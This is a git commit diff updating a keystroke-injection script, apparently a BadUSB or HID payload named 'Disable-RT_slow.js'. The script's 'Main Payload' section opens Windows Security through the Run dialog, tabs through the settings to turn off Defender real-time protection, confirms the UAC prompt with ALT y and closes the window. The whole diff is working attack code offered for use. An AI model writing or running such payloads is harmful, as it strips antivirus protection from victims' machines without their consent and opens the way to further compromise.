ec7d6532fb3cd592478806a85360e917a060ca7d
beigeworm <93350544+beigeworm@users.noreply.github.com>
2023-11-08 15:37:22 +0000

    Update Disable-RT_slow.js

--- Disable-RT_slow.js
+++ Disable-RT_slow.js
@@ -15,24 +15,27 @@ layout('us');
 // typingSpeed(1,1);
 
 // Main Payload
-press("GUI r");
-delay(2500);
-type("C:\\Windows\\explorer.exe windowsdefender:");
-delay(500);
-press("ENTER");
-delay(7000);
-press("ENTER");
-delay(2000);
-press("TAB");
-delay(300);
-press("TAB");
-delay(300);
-press("TAB");
-delay(300);
-press("TAB");
-delay(300);
-press("ENTER");
-delay(2500);
-press("ALT y");
-delay(3000);
-press("ALT F4");
+delay(1000)
+press("GUI r") 
+delay(1000) 
+type("windowsdefender:")
+delay(200)
+press("ENTER") 
+delay(5000)
+press("ENTER")
+delay(1500)
+press("TAB")
+delay(300)
+press("TAB")
+delay(300)
+press("TAB")
+delay(300)
+press("TAB")
+delay(300)
+press("ENTER")
+delay(1500)
+press("SPACEBAR")
+delay(2500)
+press("ALT y")
+delay(3000)
+press("ALT F4")
